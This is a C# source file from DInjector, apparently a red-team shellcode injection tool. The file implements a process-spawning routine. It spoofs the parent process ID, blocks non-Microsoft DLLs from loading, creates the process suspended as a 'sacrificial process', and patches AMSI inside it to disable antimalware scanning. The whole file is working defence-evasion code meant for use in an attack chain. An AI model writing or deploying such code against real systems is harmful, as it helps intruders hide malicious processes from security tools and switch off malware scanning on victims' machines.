using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    /// <summary>
    /// Based on:
    /// https://offensivedefence.co.uk/posts/ppidspoof-blockdlls-dinvoke/
    /// https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Utilities.cs
    /// </summary>
    class SpawnProcess
    {
        public static bool Is64Bit => IntPtr.Size == 8;

        public static DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION Execute(string processImage, string workingDirectory, bool suspended, int ppid, bool blockDlls, bool am51)
        {
            var startupInfoEx = new DI.Data.Win32.ProcessThreadsAPI._STARTUPINFOEX();
            startupInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfoEx);
            startupInfoEx.StartupInfo.dwFlags = (uint)DI.Data.Win32.Kernel32.STARTF.STARTF_USESHOWWINDOW;

            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            var lpSize = IntPtr.Zero;

            var attributeCount = 0;
            if (ppid != 0) attributeCount++;
            if (blockDlls) attributeCount++;

            // Should be false the first time, lpSize is given a value
            _ = Win32.InitializeProcThreadAttributeList(
                IntPtr.Zero,
                attributeCount,
                ref lpSize);

            startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);

            // Should be true now
            var result = Win32.InitializeProcThreadAttributeList(
                startupInfoEx.lpAttributeList,
                attributeCount,
                ref lpSize);

            if (result)
                Console.WriteLine("(SpawnProcess) [+] InitializeProcThreadAttributeList");
            else
                throw new Exception("(SpawnProcess) [-] InitializeProcThreadAttributeList");

            if (blockDlls)
            {
                Marshal.WriteIntPtr(lpValue,
                    Is64Bit ?
                        new IntPtr(DI.Data.Win32.Kernel32.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
                        : new IntPtr(unchecked((uint)DI.Data.Win32.Kernel32.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)));

                result = Win32.UpdateProcThreadAttribute(
                    startupInfoEx.lpAttributeList,
                    (IntPtr)DI.Data.Win32.Kernel32.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                    lpValue);

                if (result)
                    Console.WriteLine("(SpawnProcess) [+] UpdateProcThreadAttribute (blockDLLs)");
                else
                    throw new Exception("(SpawnProcess) [-] UpdateProcThreadAttribute (blockDLLs)");
            }

            if (ppid != 0)
            {
                var hParent = Process.GetProcessById(ppid).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, hParent);

                result = Win32.UpdateProcThreadAttribute(
                    startupInfoEx.lpAttributeList,
                    (IntPtr)DI.Data.Win32.Kernel32.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValue);

                if (result)
                    Console.WriteLine("(SpawnProcess) [+] UpdateProcThreadAttribute (PPID)");
                else
                    throw new Exception("(SpawnProcess) [-] UpdateProcThreadAttribute (PPID)");
            }

            var flags = DI.Data.Win32.Kernel32.EXTENDED_STARTUPINFO_PRESENT;
            if (suspended) flags |= (uint)DI.Data.Win32.Advapi32.CREATION_FLAGS.CREATE_SUSPENDED;

            if (processImage.IndexOf('*') > 0)
                processImage = processImage.Replace('*', ' ');

            result = Win32.CreateProcessA(
                processImage,
                workingDirectory,
                flags,
                startupInfoEx,
                out var pi);

            if (result)
                Console.WriteLine("(SpawnProcess) [+] CreateProcessA");
            else
                throw new Exception("(SpawnProcess) [-] CreateProcessA");

            _ = Win32.DeleteProcThreadAttributeList(startupInfoEx.lpAttributeList);
            Marshal.FreeHGlobal(lpValue);

            if (am51)
                // When patching AMSI in a sacrifical process in a suspended state, "force" option is always TRUE as we can't enumerate its loaded modules properly
                AM51.Patch(
                    processHandle: pi.hProcess,
                    processID: (int)pi.dwProcessId);

            return pi;
        }
    }
}
